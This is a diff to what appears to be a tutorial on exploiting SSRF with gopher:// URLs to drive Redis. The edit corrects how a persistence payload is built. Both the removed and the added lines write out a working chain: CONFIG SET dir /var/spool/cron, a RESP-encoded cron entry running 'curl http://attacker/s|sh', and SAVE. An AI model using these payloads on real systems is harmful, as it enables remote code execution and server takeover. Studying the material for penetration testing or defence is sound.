@@ -32,13 +32,21 @@ Redis accepts inline commands terminated by CRLF, so a gopher payload drives it 
 gopher://127.0.0.1:6379/_set%20ssrf%20proof%0d%0a
 ```
 
-Chaining several CRLF-separated lines in one payload runs a sequence. The classic persistence route reconfigures where Redis saves its database and writes an attacker-controlled key, so the dump lands as a usable file (a cron entry under `/var/spool/cron`, an authorized key, or a web shell in a served directory):
+Chaining several CRLF-separated lines in one payload runs a sequence. The classic persistence route reconfigures where Redis saves its database, writes an attacker-controlled key, then dumps it so the file lands in a useful location (a cron entry under `/var/spool/cron`, an authorized key, or a web shell in a served directory). The reconfiguration commands have no embedded newlines, so they go as inline lines:
 
 ```
-gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/spool/cron%0d%0aCONFIG%20SET%20dbfilename%20root%0d%0aSET%20x%20%22%0a*%20*%20*%20*%20*%20curl%20http://attacker/s%7Csh%0a%22%0d%0aSAVE%0d%0a
+CONFIG SET dir /var/spool/cron
+CONFIG SET dbfilename root
+SAVE
 ```
 
-Each `%0d%0a` is one line break; Redis executes `CONFIG SET dir`, `CONFIG SET dbfilename`, `SET`, then `SAVE`, writing the key as the file contents.
+The payload key is the subtlety. A cron entry needs embedded newlines, and inline Redis protocol treats a newline as the end of a command, so the value cannot be sent inline. It must go as a **RESP bulk string**, whose declared byte length counts the newlines, so Redis reads the whole multi-line value as one argument:
+
+```
+*3\r\n$3\r\nSET\r\n$1\r\nx\r\n$<N>\r\n\n\n*/1 * * * * curl http://attacker/s|sh\n\n\r\n
+```
+
+`$<N>` is the exact byte length of the value that follows (the two leading newlines, the cron line, and the two trailing newlines); the `\r\n` after it terminates the bulk string, while the `\n` inside it are data. The whole stream is then URL-encoded after the gopher item type, with `%0d%0a` for the RESP framing CRLFs and `%0a` for the data newlines. Sent inline with raw newlines instead, Redis would parse the cron text as separate malformed commands and the key would never hold the payload.
 
 ## SMTP and HTTP
 
